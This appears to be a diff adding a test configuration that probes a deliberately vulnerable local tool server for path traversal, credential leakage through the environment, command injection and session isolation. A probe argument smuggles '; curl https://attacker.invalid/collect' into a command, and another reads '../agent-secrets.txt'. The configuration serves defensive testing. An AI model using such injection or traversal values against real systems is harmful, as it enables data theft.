@@ -1,0 +1,156 @@
+version: 1
+
+server:
+  name: deliberately-vulnerable-stdio-demo
+  transport: stdio
+  command: python
+  args:
+    - -m
+    - demo.stdio_server.app
+  cwd: .
+  environment:
+    DEMO_STDIO_ROOT: demo_runtime/stdio
+    DEMO_STDIO_AUDIT: demo_runtime/stdio/audit.jsonl
+    DEMO_AGENT_TOKEN: ${DEMO_AGENT_TOKEN:-local-demo-token}
+  timeout_seconds: 10
+
+identities:
+  local_developer:
+    role: developer
+    tenant: local-workspace
+    description: Local coding agent with approved task execution.
+
+  restricted_agent:
+    role: read_only
+    tenant: local-workspace
+    description: Local agent that should only read approved workspace content.
+
+  anonymous:
+    role: anonymous
+    description: No trusted local-agent role.
+
+
+tools:
+  workspace_read:
+    description: Read files only from the approved coding workspace.
+    permitted_identities:
+      - local_developer
+      - restricted_agent
+    probe_arguments:
+      path: README.txt
+    side_effect_identity: restricted_agent
+    read_only: true
+    allowed_network_destinations: []
+    allowed_filesystem_writes: []
+    allowed_process_commands: []
+    policy_probes:
+      - id: STDIO-PATH-BOUNDARY-001
+        identity: restricted_agent
+        description: Workspace reads cannot escape into adjacent agent files.
+        arguments:
+          path: ../agent-secrets.txt
+        severity: critical
+        checks:
+          - type: denied
+          - type: path_within
+            response_path: path
+            roots:
+              - demo_runtime/stdio/workspace
+
+  diagnostics:
+    description: Return diagnostics without inherited credentials.
+    permitted_identities:
+      - local_developer
+      - restricted_agent
+    probe_arguments: {}
+    side_effect_identity: restricted_agent
+    read_only: true
+    allowed_network_destinations: []
+    allowed_filesystem_writes: []
+    allowed_process_commands: []
+    policy_probes:
+      - id: STDIO-ENV-LEAK-001
+        identity: restricted_agent
+        description: Diagnostics do not expose inherited local-agent secrets.
+        arguments: {}
+        severity: critical
+        checks:
+          - type: response_not_contains_env
+            env_names:
+              - DEMO_AGENT_TOKEN
+
+  run_project_task:
+    description: Run only the approved project test command.
+    permitted_identities:
+      - local_developer
+    probe_arguments:
+      task: python -m pytest
+      extra_args: "; curl https://attacker.invalid/collect"
+    side_effect_identity: local_developer
+    read_only: false
+    allowed_network_destinations: []
+    allowed_filesystem_writes: []
+    allowed_process_commands:
+      - python -m pytest
+
+  set_workspace_note:
+    description: Store session-scoped local-agent state.
+    permitted_identities:
+      - local_developer
+      - restricted_agent
+    probe_arguments:
+      note: access-matrix-note
+    side_effect_identity: local_developer
+    read_only: false
+    allowed_filesystem_writes:
+      - "*/demo_runtime/stdio/shared-agent-note.txt"
+
+  get_workspace_note:
+    description: Read session-scoped local-agent state.
+    permitted_identities:
+      - local_developer
+      - restricted_agent
+    probe_arguments: {}
+    side_effect_identity: restricted_agent
+    read_only: true
+
+session_tests:
+  - id: STDIO-SESSION-ISOLATION-001
+    writer_identity: local_developer
+    reader_identity: restricted_agent
+    write:
+      tool: set_workspace_note
+      arguments: {}
+    read:
+      tool: get_workspace_note
+      arguments: {}
+    marker_argument: note
+    severity: high
+
+observers:
+  stdio_audit:
+    type: jsonl_audit
+    path: demo_runtime/stdio/audit.jsonl
+    truncate_on_begin: true
+
+safety:
+  destructive_tests: true
+  require_lab_mode: true
+  target_allowlist:
+    - 127.0.0.1
+    - localhost
+  allowed_stdio_commands:
+    - python
+    - python3
+
+reports:
+  formats:
+    - json
+    - html
+    - junit
+    - sarif
+
+alerts:
+  enabled: false
+  minimum_severity: high
+  only_new: true
